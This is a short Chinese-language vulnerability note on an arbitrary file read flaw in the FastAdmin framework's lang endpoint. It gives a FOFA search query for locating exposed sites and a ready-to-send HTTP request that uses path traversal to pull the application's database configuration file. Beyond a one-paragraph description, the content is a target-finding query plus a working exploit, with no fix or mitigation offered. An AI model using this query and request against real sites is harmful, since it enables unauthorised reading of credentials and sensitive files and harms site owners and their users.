**fofa**

```
body="api.fastadmin.net"
```

**一、漏洞简述**

FastAdmin 后台框架开源且可以免费商用，一键生成 CRUD， FastAdmin 是一款基于 ThinkPHP 和 Bootstrap 的极速后台开发框架，基于Auth验证的权限管理系统，一键生成 CRUD，自动生成控制器、模型、视图、JS、语言包、菜单、回收站等。（Fast Admin 极速 后台 框架）。其接口lang存在任意文件读取漏洞，攻击者可通过该漏洞读取系统敏感文件。

**二、漏洞检测poc**

windows

```yaml
GET /index/ajax/lang?lang=../../application/database HTTP/1.1
Host: x.x.x.x
User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.2 Safari/537.36
Content-Length: 2
```

